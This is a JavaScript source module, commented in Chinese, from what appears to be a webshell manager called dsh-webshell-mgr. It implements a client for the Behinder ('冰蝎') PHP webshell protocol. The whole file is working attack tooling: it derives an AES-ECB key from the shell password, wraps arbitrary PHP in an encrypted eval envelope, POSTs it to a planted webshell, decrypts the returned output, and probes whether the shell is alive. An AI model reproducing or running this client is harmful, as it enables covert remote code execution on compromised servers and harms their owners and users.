// dsh-webshell-mgr 原生冰蝎兼容通道（behinder，PHP / AES-ECB 默认形态）：
//   密钥 key = md5(连接密码)[0:16]；请求体 = base64( AES-128-ECB( "assert|eval(base64_decode('<b64 载荷>'));" ) )
//   载荷拼装契约：载荷脚本（剥 <?）+ encrypt 函数定义 + 逐参数 $p="b64";$p=base64_decode($p); + main($p,…);
//   响应 = base64( AES-128-ECB( {"status":b64,"msg":b64} ) )
// 实现策略：不内嵌任何外部载荷文件——自带「桥接载荷」（main($whatever,$code)→eval 捕获输出），
// 经此获得完整 eval 能力（结构化文件/数据库操作全走 PHP 片段库）。协议契约兼容、代码全自有。

import { createCipheriv, createDecipheriv } from "node:crypto";
import { httpRequest, b64, unb64, md5hex } from "./http-client.js";

const BRIDGE_PAYLOAD = `
function main($whatever, $code) {
    $out = '';
    ob_start();
    try { eval($code); } catch (Throwable $e) {}
    $out = ob_get_clean();
    echo encrypt(json_encode(array("status" => base64_encode("success"), "msg" => base64_encode($out))));
}
`;

function keyOf(conn) {
	return md5hex(String(conn.password ?? "")).slice(0, 16);
}

function ecbEncrypt(key, plaintext) {
	const c = createCipheriv("aes-128-ecb", Buffer.from(key, "utf8"), null);
	return Buffer.concat([c.update(Buffer.from(plaintext, "utf8")), c.final()]);
}

function ecbDecrypt(key, ciphertext) {
	const d = createDecipheriv("aes-128-ecb", Buffer.from(key, "utf8"), null);
	return Buffer.concat([d.update(ciphertext), d.final()]);
}

/** 从载荷脚本 main() 签名提取参数名（冰蝎客户端同款契约）。 */
function mainParamsOf(script) {
	const m = /main\s*\([^)]*\)/.exec(script);
	if (!m) return [];
	const out = [];
	const re = /\$([a-zA-Z]\w*)/g;
	let mm;
	while ((mm = re.exec(m[0]))) out.push(mm[1]);
	return out;
}

/**
 * 按契约拼装并发送载荷，返回解密后的 msg 明文。
 * @param script PHP 载荷（不含 <?），须定义 main($…)
 * @param params {name: value}
 */
export async function sendPayload(conn, script, params = {}) {
	const key = keyOf(conn);
	let code = script.replace(/^\s*<\?php\b/i, "").replace(/^\s*<\?=?/, "").trim();
	// encrypt 函数注入（载荷以 echo encrypt(...) 收尾——响应加密面）
	code += `\nfunction encrypt($data){return base64_encode(openssl_encrypt($data,'AES-128-ECB','${key}',OPENSSL_RAW_DATA));}\n`;
	const names = mainParamsOf(script);
	const args = [];
	for (const name of names) {
		const v = params[name] ?? "";
		code += `$${name}="${b64(String(v))}";$${name}=base64_decode($${name});\n`;
		args.push("$" + name);
	}
	code += `\r\nmain(${args.join(",")});`;
	// 原版客户端信封带 "assert|" 前缀（PHP≤7 下为无害的未定义常量字面量，PHP 8 起致命）——
	// 马侧只 eval 解密内容、与前缀无关，本通道直接发 eval 信封（PHP 5-8 全兼容）
	const envelope = `eval(base64_decode('${b64(code)}'));`;
	const body = b64(ecbEncrypt(key, envelope));
	const res = await httpRequest({
		url: conn.url,
		method: "POST",
		headers: { "content-type": "application/octet-stream", ...(conn.headers ?? {}) },
		body,
		timeoutMs: conn.timeoutMs
	});
	if (res.status !== 200) throw new Error(`马侧拒绝（HTTP ${res.status}——密码/形态不符或马不存在）`);
	let json;
	try { json = JSON.parse(ecbDecrypt(key, unb64(res.bodyBuffer.toString("utf8").trim())).toString("utf8")); } catch { throw new Error("响应解密失败——密钥可能不匹配"); }
	const status = Buffer.from(String(json.status ?? ""), "base64").toString("utf8");
	if (status !== "success") throw new Error(`载荷执行失败：${status}`);
	return Buffer.from(String(json.msg ?? ""), "base64");
}

/** eval PHP 代码（桥接载荷）。 */
export async function evalPhp(conn, code) {
	const out = await sendPayload(conn, BRIDGE_PAYLOAD, { code });
	return out.toString("utf8");
}

const probeToken = () => "WSMP" + Math.random().toString(36).slice(2, 10).toUpperCase();

export async function probe(conn) {
	try {
		const token = probeToken();
		const out = await evalPhp({ ...conn, timeoutMs: Math.min(conn.timeoutMs, 8000) }, `echo "${token}";`);
		return out.includes(token) ? { tokenOutput: out } : null;
	} catch {
		return null;
	}
}

export const behinderCodec = {
	id: "behinder",
	label: "冰蝎型通道（AES-ECB）",
	langs: ["php"],
	caps: { cmd: true, code: true, b64rw: false },
	evalPhp,
	sendPayload
};
